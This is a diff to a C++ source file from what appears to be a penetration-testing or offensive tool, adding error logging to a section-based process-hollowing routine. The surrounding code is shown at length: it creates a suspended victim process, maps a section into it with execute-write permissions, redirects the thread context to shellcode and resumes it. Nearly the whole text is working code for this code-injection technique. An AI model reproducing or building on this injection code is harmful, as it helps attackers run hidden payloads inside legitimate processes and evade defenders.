@@ -156,7 +156,9 @@ namespace PT::SectionInjection {
 	{
 		const auto& nt = nt_apis();
 		if (!nt.ok) {
-			return std::nullopt;   // ntdll import resolution failed
+			std::fprintf(stderr,
+				"[section-hollow] ntdll import resolution failed (missing NtCreateSection/NtMapViewOfSection/NtUnmapViewOfSection)\n");
+			return std::nullopt;
 		}
 
 		// ---- 1. Create the victim process in CREATE_SUSPENDED --------------
@@ -176,6 +178,9 @@ namespace PT::SectionInjection {
 				nullptr, nullptr,
 				&si, &pi))
 		{
+			std::fprintf(stderr,
+				"[section-hollow] CreateProcessW failed: err=%lu path='%ls'\n",
+				GetLastError(), victim_exe_path.c_str());
 			return std::nullopt;
 		}
 
@@ -192,6 +197,9 @@ namespace PT::SectionInjection {
 			SEC_COMMIT,
 			nullptr);
 		if (!NT_SUCCESS(st) || section == nullptr) {
+			std::fprintf(stderr,
+				"[section-hollow] NtCreateSection failed: NTSTATUS=0x%08lX\n",
+				static_cast<unsigned long>(st));
 			TerminateProcess(pi.hProcess, 1);
 			CloseHandle(pi.hThread);
 			CloseHandle(pi.hProcess);
@@ -208,6 +216,9 @@ namespace PT::SectionInjection {
 			VIEW_UNMAP, 0,
 			PAGE_READWRITE);
 		if (!NT_SUCCESS(st)) {
+			std::fprintf(stderr,
+				"[section-hollow] NtMapViewOfSection (local view) failed: NTSTATUS=0x%08lX\n",
+				static_cast<unsigned long>(st));
 			CloseHandle(section);
 			TerminateProcess(pi.hProcess, 1);
 			CloseHandle(pi.hThread);
@@ -227,6 +238,9 @@ namespace PT::SectionInjection {
 			VIEW_UNMAP, 0,
 			PAGE_EXECUTE_READWRITE);
 		if (!NT_SUCCESS(st)) {
+			std::fprintf(stderr,
+				"[section-hollow] NtMapViewOfSection (remote view into victim) failed: NTSTATUS=0x%08lX\n",
+				static_cast<unsigned long>(st));
 			nt.NtUnmapViewOfSection(GetCurrentProcess(), local_base);
 			CloseHandle(section);
 			TerminateProcess(pi.hProcess, 1);
@@ -257,6 +271,7 @@ namespace PT::SectionInjection {
 		CONTEXT ctx{};
 		ctx.ContextFlags = CONTEXT_FULL;
 		if (!GetThreadContext(pi.hThread, &ctx)) {
+			std::fprintf(stderr, "[section-hollow] GetThreadContext failed: err=%lu\n", GetLastError());
 			nt.NtUnmapViewOfSection(pi.hProcess,           remote_base);
 			nt.NtUnmapViewOfSection(GetCurrentProcess(),   local_base);
 			CloseHandle(section);
@@ -271,6 +286,7 @@ namespace PT::SectionInjection {
 		ctx.Eip = reinterpret_cast<DWORD>(remote_base) + SHELLCODE_OFFSET;
 #endif
 		if (!SetThreadContext(pi.hThread, &ctx)) {
+			std::fprintf(stderr, "[section-hollow] SetThreadContext failed: err=%lu\n", GetLastError());
 			nt.NtUnmapViewOfSection(pi.hProcess,           remote_base);
 			nt.NtUnmapViewOfSection(GetCurrentProcess(),   local_base);
 			CloseHandle(section);
@@ -282,6 +298,7 @@ namespace PT::SectionInjection {
 
 		// ---- 7. Resume — shellcode starts running -------------------------
 		if (ResumeThread(pi.hThread) == static_cast<DWORD>(-1)) {
+			std::fprintf(stderr, "[section-hollow] ResumeThread failed: err=%lu\n", GetLastError());
 			nt.NtUnmapViewOfSection(pi.hProcess,           remote_base);
 			nt.NtUnmapViewOfSection(GetCurrentProcess(),   local_base);
 			CloseHandle(section);
